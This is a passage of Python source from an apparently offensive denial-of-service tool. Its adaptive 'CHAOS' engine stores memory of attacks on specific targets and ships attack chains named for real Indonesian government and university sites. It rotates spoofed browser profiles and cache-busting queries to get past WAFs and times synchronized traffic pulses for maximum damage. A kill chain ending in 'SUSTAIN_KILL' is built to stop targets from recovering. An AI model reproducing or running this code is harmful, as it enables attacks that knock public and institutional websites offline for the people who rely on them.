        "wp_bare_nuke":     ["XMLRPC_AMP", "WP_SEARCH", "XMLRPC_AMP", "WP_SEARCH", "POST_DYN", "XMLRPC_AMP"],
        # Trained from hardosoloplast (LiteSpeed+WP+Cache: fuzz queries to bypass LSCache)
        "lscache_piercer":  ["WP_SEARCH", "DYN", "WP_SEARCH", "STEALTH_JA3", "WP_SEARCH", "POST_DYN"],
        # Trained from surakarta.go.id (Apache+Laravel+RateLimit: stealth under threshold)
        "gov_infiltrator":  ["STEALTH_JA3", "SLOW_V2", "POST_DYN", "COOKIE", "STEALTH_JA3", "SLOW_V2"],
        # Generic Indonesian government site chain (usually weak Apache + old PHP)
        "indo_gov_siege":   ["SLOW_V2", "SLOW_V2", "POST_DYN", "STRESS", "SLOW_V2", "PPS"],
        # LiteSpeed HTTP/3 exploitation (alt-svc h3 detected on both LS sites)
        "litespeed_h3_flood": ["STRESS", "PPS", "POST_DYN", "STRESS", "DYN", "PPS"],
        # --- V36: Batch 2 Real-World Trained Chains ---
        # raynaldotech.my.id (Vercel+CF = ultra-strict, stealth-only)
        "vercel_ghost":     ["STEALTH_JA3", "STEALTH_JA3", "COOKIE", "STEALTH_JA3", "SLOW_V2", "STEALTH_JA3"],
        # satudata (CI bare, no WAF = full brute force)
        "ci_demolisher":    ["POST_DYN", "STRESS", "PPS", "POST_DYN", "DYN", "STRESS"],
        # uns.ac.id (WP headless, .env exposed, wp-json/feed/posts all open)
        "wp_headless_raid": ["WP_SEARCH", "POST_DYN", "WP_SEARCH", "DYN", "XMLRPC_AMP", "WP_SEARCH"],
        # ums.ac.id (Nuxt+CF+GCP, 432KB page, stale-while-revalidate)
        "nuxt_gcp_siege":   ["STEALTH_JA3", "SLOW_V2", "STEALTH_JA3", "POST_DYN", "STEALTH_JA3", "SLOW_V2"],
        # University general pattern
        "uni_blitz":        ["STRESS", "WP_SEARCH", "POST_DYN", "SLOW_V2", "PPS", "DYN"],
    }
    
    def _chaos_save_memory(self):
        """Persist learned intelligence to disk for future attacks on same target."""
        intel = self._chaos_intel
        if intel.get("saved_to_disk") or intel["total_executions"] < 100:
            return
        try:
            target_host = self._target.authority.replace(":", "_").replace(".", "_")
            memory_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files")
            os.makedirs(memory_dir, exist_ok=True)
            memory_file = os.path.join(memory_dir, f"chaos_memory_{target_host}.json")
            
            # Save only the useful learned data
            save_data = {
                "waf_type": intel.get("waf_type"),
                "server_type": intel.get("server_type"),
                "cms_type": intel.get("cms_type"),
                "has_captcha": intel.get("has_captcha"),
                "has_rate_limit": intel.get("has_rate_limit"),
                "endpoints_discovered": intel.get("endpoints_discovered", []),
                "efficiency_score": intel.get("efficiency_score", {}),
                "best_method": intel.get("best_method"),
                "target_weakpoint": intel.get("target_weakpoint"),
                "response_time_ms": intel.get("response_time_ms", 0),
                "gene_pool": intel.get("gene_pool", [])[:3],
                "rate_limit_threshold": intel.get("rate_limit_threshold"),
                "path_scores": dict(list(intel.get("path_scores", {}).items())[:20]),
                "backend_lang": intel.get("backend_lang"),
                "backend_framework": intel.get("backend_framework"),
                "resource_target": intel.get("resource_target"),
                "infra_map": intel.get("infra_map", {}),
            }
            with open(memory_file, 'w') as f:
                json.dump(save_data, f, indent=2)
            intel["saved_to_disk"] = True
        except Exception:
            pass
    
    def _chaos_load_memory(self):
        """Load previously learned intelligence about this target."""
        intel = self._chaos_intel
        try:
            target_host = self._target.authority.replace(":", "_").replace(".", "_")
            memory_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files", f"chaos_memory_{target_host}.json")
            if os.path.exists(memory_file):
                with open(memory_file, 'r') as f:
                    saved = json.load(f)
                # Apply saved intelligence (but don't override fresh recon)
                if not intel.get("recon_done"):
                    for key in ["waf_type", "server_type", "cms_type", "has_captcha", 
                                "has_rate_limit", "endpoints_discovered", "best_method",
                                "target_weakpoint", "response_time_ms"]:
                        if key in saved and saved[key]:
                            intel[key] = saved[key]
                    intel["recon_done"] = True  # Skip slow recon, use memory
                    
                # Always load efficiency scores as starting knowledge
                if "efficiency_score" in saved:
                    intel["efficiency_score"] = saved["efficiency_score"]
                    
                print(f"{bcolors.OKGREEN}[CHAOS] Previous attack memory loaded for {self._target.authority}{bcolors.RESET}")
                return True
        except Exception:
            pass
        return False
    
    def _chaos_build_dynamic_combo(self):
        """Generate a custom combo chain from the top-performing methods."""
        intel = self._chaos_intel
        eff_scores = intel.get("efficiency_score", {})
        
        if len(eff_scores) < 3:
            return None  # Not enough data yet
            
        # Sort by efficiency, take top 3
        sorted_methods = sorted(eff_scores.items(), key=lambda x: -x[1])[:3]
        top_methods = [m[0] for m in sorted_methods]
        
        # Build a custom combo: heavy on the best, sprinkled with variety
        combo = []
        for _ in range(5):
            # 60% chance for the best method, 25% for second, 15% for third
            roll = randint(1, 100)
            if roll <= 60:
                combo.append(top_methods[0])
            elif roll <= 85:
                combo.append(top_methods[1])
            else:
                combo.append(top_methods[2])
        
        return combo
    
    def _chaos_wave_control(self):
        """Multi-wave attack pattern: RISE -> PEAK -> FALL -> REST -> repeat.
        Mimics natural traffic fluctuation to avoid flat-line detection."""
        intel = self._chaos_intel
        intel["wave_tick"] += 1
        tick = intel["wave_tick"]
        
        wave = intel.get("wave_state", "RISE")
        
        if wave == "RISE" and tick >= randint(15, 25):
            intel["wave_state"] = "PEAK"
            intel["wave_tick"] = 0
            intel["temperature"] = min(intel["temperature"] + 0.2, 1.0)
        elif wave == "PEAK" and tick >= randint(30, 50):
            intel["wave_state"] = "FALL"
            intel["wave_tick"] = 0
        elif wave == "FALL" and tick >= randint(10, 20):
            intel["wave_state"] = "REST"
            intel["wave_tick"] = 0
            intel["temperature"] = max(intel["temperature"] - 0.15, 0.2)
        elif wave == "REST" and tick >= randint(5, 10):
            intel["wave_state"] = "RISE"
            intel["wave_tick"] = 0
            intel["temperature"] = min(intel["temperature"] + 0.1, 0.8)
            
        return intel["wave_state"]

    # ========================================================================
    #  BROWSER PROFILE DATABASE: Complete header sets for different browsers
    #  WAFs correlate User-Agent with header order and values
    #  Using mismatched headers is an instant bot detection signal
    # ========================================================================
    _BROWSER_PROFILES = [
        {   # Chrome 136 Windows
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
            "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Chrome 136 macOS
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
            "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"macOS"',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Firefox 131 Windows
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Firefox 131 Linux
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Safari 17 macOS
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Edge 130 Windows
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/130.0.0.0",
            "Sec-Ch-Ua": '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": '"Windows"',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        },
        {   # Chrome Mobile Android
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36",
            "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1", "Sec-Ch-Ua-Platform": '"Android"',
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        },
    ]
    
    def _chaos_get_browser_profile(self):
        """Select a random complete browser profile for header consistency."""
        return dict(randchoice(self._BROWSER_PROFILES))
    
    def _chaos_battle_briefing(self):
        """Display comprehensive pre-attack battle plan based on all gathered intelligence.
        This is the AI 'thinking out loud' to show its decision-making process."""
        intel = self._chaos_intel
        if intel.get("briefing_shown"):
            return
        intel["briefing_shown"] = True
        
        waf = intel.get("waf_type", "unknown")
        server = intel.get("server_type", "unknown")
        cms = intel.get("cms_type", "custom")
        backend = intel.get("backend_lang", "unknown")
        framework = intel.get("backend_framework", "")
        resource = intel.get("resource_target", "auto")
        captcha = intel.get("has_captcha", False)
        rate_limit = intel.get("has_rate_limit", False)
        rt = intel.get("response_time_ms", 0)
        discovered = intel.get("endpoints_discovered", [])
        uncached = intel.get("uncached_paths", [])
        threshold = intel.get("rate_limit_threshold")
        
        # Calculate threat assessment
        threat_score = 0
        if waf not in ("none", None): threat_score += 3
        if waf in ("cloudflare", "akamai", "imperva"): threat_score += 2
        if captcha: threat_score += 2
        if rate_limit: threat_score += 1
        if threshold and threshold < 10: threat_score += 2
        
        threat_label = {0: "MINIMAL", 1: "LOW", 2: "LOW", 3: "MODERATE", 
                        4: "MODERATE", 5: "HIGH", 6: "HIGH", 7: "SEVERE",
                        8: "CRITICAL", 9: "CRITICAL", 10: "EXTREME"}.get(min(threat_score, 10), "EXTREME")
        threat_colors = {"MINIMAL": bcolors.OKGREEN, "LOW": bcolors.OKGREEN, "MODERATE": bcolors.WARNING,
                         "HIGH": bcolors.FAIL, "SEVERE": bcolors.FAIL, "CRITICAL": bcolors.FAIL, "EXTREME": bcolors.FAIL}
        
        # Determine primary strategy
        if waf in ("cloudflare", "akamai", "ddosguard"):
            primary_strategy = "STEALTH INFILTRATION - TLS mimicry + slow connection draining"
        elif cms == "wordpress":
            primary_strategy = "DATABASE ANNIHILATION - XMLRPC multicall + search exhaustion"
        elif waf == "none" and backend in ("php", "python", "ruby"):
            primary_strategy = "CPU SATURATION - High-computation request flooding"
        elif waf == "none" and backend in ("nodejs", "java", "aspnet"):
            primary_strategy = "MEMORY EXHAUSTION - Slowloris + sustained connection drain"
        elif waf == "none":
            primary_strategy = "FULL SPECTRUM ASSAULT - All methods at maximum rate"
        else:
            primary_strategy = "ADAPTIVE PENETRATION - Test and exploit discovered weaknesses"
        
        # Experience match
        exp_key = (waf, server, cms)
        has_experience = exp_key in self._EXPERIENCE_DB
        
        # Memory from past attacks
        has_memory = intel.get("_memory_checked") and intel.get("recon_done")
        
        print(f"")
        print(f"{bcolors.OKCYAN}{'='*70}{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}  CHAOS V20 - PRE-ATTACK BATTLE BRIEFING{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}{'='*70}{bcolors.RESET}")
        print(f"")
        print(f"  {bcolors.BOLD}[TARGET INFRASTRUCTURE]{bcolors.RESET}")
        print(f"    WAF        : {bcolors.WARNING}{(waf or 'none').upper()}{bcolors.RESET}")
        print(f"    Server     : {server}")
        print(f"    CMS        : {bcolors.OKBLUE}{(cms or 'custom').upper()}{bcolors.RESET}")
        print(f"    Backend    : {backend}{(' / ' + framework) if framework else ''}")
        print(f"    Latency    : {rt}ms")
        print(f"    Captcha    : {'YES' if captcha else 'NO'}")
        print(f"    Rate Limit : {'YES' if rate_limit else 'NO'}{(f' (threshold: {threshold} req/burst)') if threshold else ''}")
        print(f"    Endpoints  : {len(discovered)} discovered, {len(uncached)} cache-bypassing")
        print(f"")
        print(f"  {bcolors.BOLD}[THREAT ASSESSMENT]{bcolors.RESET}")
        print(f"    Level      : {threat_colors.get(threat_label, '')}{threat_label} ({threat_score}/10){bcolors.RESET}")
        print(f"    Experience : {'VETERAN (pattern matched)' if has_experience else 'NEW TARGET (exploring)'}")
        print(f"    Memory     : {'LOADED from previous attack' if has_memory else 'Fresh start'}")
        print(f"")
        print(f"  {bcolors.BOLD}[BATTLE PLAN]{bcolors.RESET}")
        print(f"    Strategy   : {bcolors.WARNING}{primary_strategy}{bcolors.RESET}")
        print(f"    Weak Point : {resource.upper()} ({backend} servers are weak here)")
        print(f"    Kill Chain : RECON > PROBE > WEAKEN > BREACH > OVERWHELM > SUSTAIN")
        print(f"")
        print(f"{bcolors.OKCYAN}{'='*70}{bcolors.RESET}")
        print(f"{bcolors.OKGREEN}  ENGAGING TARGET... All systems operational.{bcolors.RESET}")
        print(f"{bcolors.OKCYAN}{'='*70}{bcolors.RESET}")
        print(f"")
    
    def _chaos_hot_streak(self, method_name, success):
        """Track and exploit hot streaks - methods that are succeeding consecutively.
        If a method wins 5+ times in a row, it has found a gap. Exploit it harder."""
        intel = self._chaos_intel
        
        if method_name not in intel["method_streaks"]:
            intel["method_streaks"][method_name] = 0
            
        if success:
            intel["method_streaks"][method_name] += 1
            # Hot streak detected
            if intel["method_streaks"][method_name] >= 5:
                intel["hot_streak_method"] = method_name
        else:
            intel["method_streaks"][method_name] = 0
            if intel.get("hot_streak_method") == method_name:
                intel["hot_streak_method"] = None
    
    def _chaos_track_diversity(self, method_name):
        """Track method diversity to prevent over-reliance on a single vector.
        True expertise means using the RIGHT method, not just the SAME method."""
        intel = self._chaos_intel
        
        intel["method_diversity_window"].append(method_name)
        if len(intel["method_diversity_window"]) > 20:
            intel["method_diversity_window"] = intel["method_diversity_window"][-20:]
            
        # Calculate diversity score (unique methods in last 20)
        unique = len(set(intel["method_diversity_window"]))
        intel["method_diversity_score"] = unique
        
        # Track total by method
        if method_name not in intel["total_requests_by_method"]:
            intel["total_requests_by_method"][method_name] = 0
        intel["total_requests_by_method"][method_name] += 1
    
    def _chaos_swarm_sync(self):
        """Swarm Intelligence: Synchronize all threads to strike at the exact same millisecond.
        Instead of staggered traffic, a pulse creates a massive instantaneous connection spike
        which is devastating to connection queues and load balancers."""
        intel = self._chaos_intel
        now = time()
        
        # Determine if a pulse is scheduled in the near future (within 1.5 seconds)
        pulse_time = intel.get("swarm_pulse_time", 0)
        
        if pulse_time > now:
            # We are waiting for the pulse. Sleep exactly until it's time to strike
            sleep_time = pulse_time - now
            if sleep_time < 1.5:
                sleep(sleep_time)
                return True
                
        # If no active pulse, randomly elect one thread to schedule a pulse (every ~150 execs across all threads)
        elif intel["total_executions"] % 150 == 0 and intel.get("phase") in ("ASSAULT", "BREACH", "OVERWHELM"):
            # Set the pulse for 1.0 seconds from now
            intel["swarm_pulse_time"] = now + 1.0
            intel["pulse_count"] += 1
            if int(REQUESTS_SENT) < 200:
                print(f"{bcolors.FAIL}[CHAOS SWARM] Pulse coordinated. All threads locking onto target...{bcolors.RESET}")
            
        return False
        
    def _chaos_fuzz_query(self, path):
        """Add organic-looking query parameters to break caches and confuse WAFs.
        Uses marketing trackers (UTM) which WAFs are programmed to let pass."""
        if "?" in path:
            return path
            
        intel = self._chaos_intel
        intel["utm_rotation"] += 1
        rot = intel["utm_rotation"] % 5
        
        rs = ProxyTools.Random.rand_str
        fuzzers = [
            f"?utm_source=google&utm_medium=cpc&utm_campaign={rs(6)}",
            f"?ref={rs(8)}&session_id={rs(16)}",
            f"?v={int(time())}&cache={rs(5)}",
            f"?lang=en&currency=USD&id={randint(100, 9999)}",
            f"?click_id={rs(12)}&source=affiliate"
        ]
        return path + fuzzers[rot]
        
    def _chaos_self_heal_proxies(self):
        """Monitor proxy effectiveness. If the proxy pool is burning out,
        aggressively auto-purge slow/dead proxies to maintain high RPM."""
        intel = self._chaos_intel
        if intel["total_executions"] % 300 != 0:
            return
            
        # Check overall efficiency
        eff_scores = intel.get("efficiency_score", {})
        if not eff_scores:
            return
            
        avg_eff = sum(eff_scores.values()) / max(len(eff_scores), 1)
        
        # If efficiency drops below 40% and we have burned proxies, we need healing
        if avg_eff < 0.4 and len(BURNED_PROXIES) > 0:
            intel["proxy_health_purged"] += 1
            # Give exploration bonus a reset so it tries to find new proxy-method synergies
            intel["exploration_bonus"] = True
            if int(REQUESTS_SENT) % 500 == 0:
                print(f"{bcolors.WARNING}[CHAOS AI] Purging dead/slow proxies and recalibrating connections...{bcolors.RESET}")

    def _chaos_force_diversity(self, weights, method_map):
        """If diversity is too low (using same method >80% of time), force variety.
        This prevents WAF from easily fingerprinting our attack pattern."""
        intel = self._chaos_intel
        window = intel.get("method_diversity_window", [])
        
        if len(window) < 10:
            return weights
            
        # Check if any single method dominates >70% of recent picks
        from collections import Counter
        counts = Counter(window[-15:])
        most_common_method, most_common_count = counts.most_common(1)[0]
        
        if most_common_count > 10:  # >66% dominance
            # Temporarily suppress the dominant method
            weights[most_common_method] = max(weights.get(most_common_method, 0) // 3, 2)
            # Boost underused methods
            for method in method_map:
                if method not in counts and method in weights and weights[method] > 0:
                    weights[method] = max(weights[method] * 2, 15)
                    
        return weights

    def _chaos_detect_backend(self):
        """Deep backend technology detection from response headers and behavior."""
        intel = self._chaos_intel
        if intel.get("backend_lang"):
            return  # Already detected
            
        try:
            import urllib.request
            target_url = f"{self._target.scheme}://{self._target.authority}/"
            
            # Probe with a request that triggers error pages (version leaks)
            probe_paths = [
                "/",
                "/nonexistent_" + str(randint(10000,99999)),  # 404 page
                "/wp-json/wp/v2/posts",                        # WordPress REST API
            ]
            
            for probe_path in probe_paths:
                try:
                    url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
                    req = urllib.request.Request(url, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
                    })
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        headers = str(resp.headers).lower()
                        powered_by = resp.headers.get('X-Powered-By', '').lower()
                        body = resp.read(4096).decode('utf-8', errors='ignore').lower()
                        
                        # Detect backend language
                        if 'php' in powered_by or 'php' in headers:
                            intel["backend_lang"] = "php"
                        elif 'express' in powered_by or 'x-powered-by: express' in headers:
                            intel["backend_lang"] = "nodejs"
                            intel["backend_framework"] = "express"
                        elif 'asp.net' in powered_by or 'asp.net' in headers:
                            intel["backend_lang"] = "aspnet"
                        elif 'django' in body or 'csrfmiddlewaretoken' in body:
                            intel["backend_lang"] = "python"
                            intel["backend_framework"] = "django"
                        elif 'flask' in headers or 'werkzeug' in headers:
                            intel["backend_lang"] = "python"
                            intel["backend_framework"] = "flask"
                        elif 'x-powered-by: next' in headers or '__next' in body:
                            intel["backend_lang"] = "nodejs"
                            intel["backend_framework"] = "nextjs"
                        elif 'phusion passenger' in headers or 'x-powered-by: passenger' in headers:
                            intel["backend_lang"] = "ruby"
                            intel["backend_framework"] = "rails"
                        elif 'laravel' in headers or 'laravel_session' in headers:
                            intel["backend_lang"] = "php"
                            intel["backend_framework"] = "laravel"
                        elif 'spring' in headers or 'jsessionid' in headers:
                            intel["backend_lang"] = "java"
                            intel["backend_framework"] = "spring"
                            
                        if intel.get("backend_lang"):
                            break
                except Exception:
                    continue
                    
            if not intel.get("backend_lang"):
                # Heuristic based on CMS
                cms_backend_map = {
                    "wordpress": "php", "joomla": "php", "drupal": "php",
                    "shopify": "ruby", "nextjs": "nodejs", "laravel": "php",
                }
                intel["backend_lang"] = cms_backend_map.get(intel.get("cms_type"), "unknown")
                
            # Auto-select resource target based on backend
            if intel["backend_lang"] in self._BACKEND_WEAKNESSES:
                intel["resource_target"] = self._BACKEND_WEAKNESSES[intel["backend_lang"]]["resource"]
            
            # Build infrastructure map
            intel["infra_map"] = {
                "waf": intel.get("waf_type"),
                "server": intel.get("server_type"),
                "cms": intel.get("cms_type"),
                "backend": intel.get("backend_lang"),
                "framework": intel.get("backend_framework"),
                "captcha": intel.get("has_captcha"),
                "rate_limit": intel.get("has_rate_limit"),
                "rate_threshold": intel.get("rate_limit_threshold"),
                "weak_resource": intel.get("resource_target"),
            }
            
            if int(REQUESTS_SENT) < 20:
                print(f"{bcolors.OKCYAN}[CHAOS DEEP SCAN] Backend: {intel['backend_lang']} | Framework: {intel.get('backend_framework', 'N/A')} | Weak Resource: {intel['resource_target']}{bcolors.RESET}")
                
        except Exception:
            intel["backend_lang"] = "unknown"
    
    def _chaos_time_intensity(self):
        """Adjust attack intensity based on time-of-day patterns.
        Servers are typically under heaviest legitimate load during business hours.
        Attacking during peak hours means less capacity to absorb our traffic."""
        intel = self._chaos_intel
        now = time()
        
        if now - intel.get("last_intensity_check", 0) < 300:  # Check every 5 min
            return intel.get("time_intensity", 1.0)
            
        intel["last_intensity_check"] = now
        
        try:
            from datetime import datetime
            hour = datetime.utcnow().hour  # UTC hour
            
            # Business hours (9-17 UTC) = server under more load = easier to overwhelm
            if 9 <= hour <= 17:
                intel["time_intensity"] = 1.3   # 30% more aggressive
            elif 6 <= hour <= 9 or 17 <= hour <= 21:
                intel["time_intensity"] = 1.1   # Slightly more
            elif 0 <= hour <= 6:
                intel["time_intensity"] = 0.8   # Off-hours, server has spare capacity
            else:
                intel["time_intensity"] = 1.0
        except Exception:
            intel["time_intensity"] = 1.0
            
        return intel["time_intensity"]
    
    def _chaos_cognitive_state(self):
        """Track the AI's cognitive maturity level based on data collected.
        LEARNING -> EXPLOITING -> ADAPTING -> MASTERING"""
        intel = self._chaos_intel
        tick = intel["total_executions"]
        eff = intel.get("efficiency_score", {})
        
        if tick < 50 or len(eff) < 3:
            intel["cognitive_state"] = "LEARNING"
        elif tick < 200:
            avg_eff = sum(eff.values()) / max(len(eff), 1) if eff else 0
            if avg_eff > 0.5:
                intel["cognitive_state"] = "EXPLOITING"
            else:
                intel["cognitive_state"] = "LEARNING"
        elif tick < 500:
            if intel.get("target_weakpoint") and intel.get("best_method"):
                intel["cognitive_state"] = "ADAPTING"
            else:
                intel["cognitive_state"] = "EXPLOITING"
        else:
            if intel.get("generation", 0) >= 3 and intel.get("gene_pool"):
                intel["cognitive_state"] = "MASTERING"
            else:
                intel["cognitive_state"] = "ADAPTING"
                
        return intel["cognitive_state"]
    
    def _chaos_log_event(self, event_type, detail):
        """Log significant attack events for post-analysis."""
        intel = self._chaos_intel
        entry = {"t": int(time() - intel.get("attack_start_time", time())), 
                 "type": event_type, "detail": detail}
        intel["attack_log"].append(entry)
        if len(intel["attack_log"]) > 100:
            intel["attack_log"] = intel["attack_log"][-100:]

    def _chaos_kill_chain(self):
        """Structured Kill Chain Protocol with specific objectives per phase.
        Unlike random phase transitions, this follows a deliberate attack doctrine."""
        intel = self._chaos_intel
        tick = intel["total_executions"]
        phase = intel.get("kill_chain_phase", "RECON")
        
        # Phase transitions based on observable conditions, not just tick count
        if phase == "RECON" and intel.get("recon_done"):
            intel["kill_chain_phase"] = "PROBE"
            intel["kill_chain_objective"] = "Test all methods, discover rate limits and weakpoints"
            
        elif phase == "PROBE" and tick > 50:
            intel["kill_chain_phase"] = "WEAKEN"
            intel["kill_chain_objective"] = "Exhaust connection pool and consume server memory"
            
        elif phase == "WEAKEN":
            # Advance to BREACH when target shows signs of struggle
            if intel.get("target_getting_weaker") or (intel.get("health_history") and len(intel["health_history"]) > 3 and intel["health_history"][-1] > intel.get("response_time_ms", 500) * 1.8):
                intel["kill_chain_phase"] = "BREACH"
                intel["kill_chain_objective"] = "Exploit weakpoint with maximum concentrated force"
                
        elif phase == "BREACH":
            # Advance to OVERWHELM when we see 5xx or target_is_down
            if intel.get("consecutive_5xx", 0) >= 2 or intel.get("target_is_down"):
                intel["kill_chain_phase"] = "OVERWHELM"
                intel["kill_chain_objective"] = "Full spectrum attack to ensure complete collapse"
                
        elif phase == "OVERWHELM":
            # Advance to SUSTAIN_KILL after confirmed down
            if intel.get("target_is_down"):
                intel["kill_chain_phase"] = "SUSTAIN_KILL"
                intel["kill_chain_objective"] = "Maintain minimum pressure to prevent target recovery"
                
        elif phase == "SUSTAIN_KILL":
            # If target recovers, go back to BREACH
            if intel.get("recovery_detected"):
                intel["kill_chain_phase"] = "BREACH"
                intel["kill_chain_objective"] = "Target recovering! Re-engaging with concentrated force"
                intel["recovery_counter"] += 1
                
        return intel["kill_chain_phase"]
    
    def _chaos_predict_ttd(self):
        """Predict Time-To-Down: estimate when the target will collapse based on latency trends.
        Uses linear regression on health_history to extrapolate when response_time hits infinity."""
        intel = self._chaos_intel
        hp = intel.get("health_history", [])
        
        if len(hp) < 5:
            return None
            
        # Calculate slope of latency trend (simple linear regression)
        n = len(hp)
        x_vals = list(range(n))
        x_mean = sum(x_vals) / n
        y_mean = sum(hp) / n
        
        numerator = sum((x - x_mean) * (y - y_mean) for x, y in zip(x_vals, hp))
        denominator = sum((x - x_mean) ** 2 for x in x_vals)
        
        if denominator == 0:
            return None
            
        slope = numerator / denominator
        intel["latency_trend_slope"] = slope
        
        # Detect recovery: slope is negative (latency dropping = target recovering)
        if slope < -50 and len(hp) > 5:
            intel["recovery_detected"] = True
        else:
            intel["recovery_detected"] = False
        
        # Predict when latency reaches "critical" (10000ms = effectively down)
        if slope > 0:
            current_latency = hp[-1]
            critical_latency = 10000
            remaining_ms = critical_latency - current_latency
            
            if remaining_ms > 0 and slope > 0:
                # Each health check is ~30 seconds apart
                checks_to_down = remaining_ms / slope
                seconds_to_down = int(checks_to_down * 30)
                intel["predicted_ttd"] = max(seconds_to_down, 0)
                return seconds_to_down
                
        intel["predicted_ttd"] = None
        return None
    
    def _chaos_track_proxy_affinity(self, method_name, proxy_addr, success):
        """Track which proxies work best with which attack methods.
        Some proxies may be on cleaner IP ranges that certain WAFs trust more."""
        intel = self._chaos_intel
        if not proxy_addr:
            return
            
        key = str(proxy_addr)
        if key not in intel["proxy_method_affinity"]:
            intel["proxy_method_affinity"][key] = {}
        if method_name not in intel["proxy_method_affinity"][key]:
            intel["proxy_method_affinity"][key][method_name] = {"s": 0, "t": 0}
            
        intel["proxy_method_affinity"][key][method_name]["t"] += 1
        if success:
            intel["proxy_method_affinity"][key][method_name]["s"] += 1
            
        # Update best proxy for method (every 50 attempts)
        if intel["proxy_method_affinity"][key][method_name]["t"] % 50 == 0:
            self._chaos_compute_best_proxies(method_name)
    
    def _chaos_compute_best_proxies(self, method_name):
        """Find the top 3 proxies for a given method."""
        intel = self._chaos_intel
        proxy_scores = []
        
        for proxy_key, methods in intel["proxy_method_affinity"].items():
            if method_name in methods:
                data = methods[method_name]
                if data["t"] >= 10:  # Need at least 10 attempts
                    rate = data["s"] / data["t"]
                    proxy_scores.append((proxy_key, rate))
                    
        proxy_scores.sort(key=lambda x: -x[1])
        intel["best_proxy_for_method"][method_name] = [p[0] for p in proxy_scores[:3]]
    
    def _chaos_http_method_expand(self):
        """Generate HTTP requests using HEAD, OPTIONS, PATCH to diversify attack surface.
        Each HTTP method consumes server resources differently."""
        try:
            s = self.open_connection()
            profile = self._chaos_get_browser_profile()
            path = self.get_random_target_path()
            if not path.startswith("/"):
                path = "/" + path
            
            # Pick a non-standard HTTP method
            http_method = randchoice(["HEAD", "OPTIONS", "PATCH", "PUT", "DELETE"])
            referer = self._chaos_get_smart_referer()
            
            # Generate base headers
            headers_block = (f"Host: {self._target.authority}\r\n"
                             f"User-Agent: {profile.get('User-Agent', randchoice(self._useragents))}\r\n"
                             f"Accept: {profile.get('Accept', '*/*')}\r\n"
                             f"Referer: {referer}\r\n"
                             f"Connection: keep-alive\r\n")
            
            # Corrupt headers with PsyOps to break Sysadmin logs
            headers_block = self._chaos_psy_ops_headers(headers_block)
            
            # Attempt Web Cache Poisoning (WCP)
            poison = self._chaos_cache_poisoning()
            if poison and ":" in poison:
                headers_block += f"{poison}\r\n"
            
            payload = f"{http_method} {path} {"HTTP/2.0" if randint(1,4)==1 else "HTTP/1.1"}\r\n" + headers_block
            
            # Add body for PATCH/PUT
            if http_method in ("PATCH", "PUT"):
                body = self._generate_post_payload()
                payload += f"Content-Type: application/json\r\n"
                payload += f"Content-Length: {len(body)}\r\n"
                payload += f"\r\n{body}"
            else:
                payload += f"\r\n"
                
            Tools.send(s, payload.encode("utf-8"))
            REQUESTS_SENT.increment()
            Tools.safe_close(s)
        except Exception:
            pass
    
    def _chaos_evolve_weights(self):
        """Genetic Algorithm: Evolve optimal weight configurations across generations.
        Top-performing weight sets breed and mutate to create superior strategies."""
        intel = self._chaos_intel
        
        # Only evolve every 100 executions
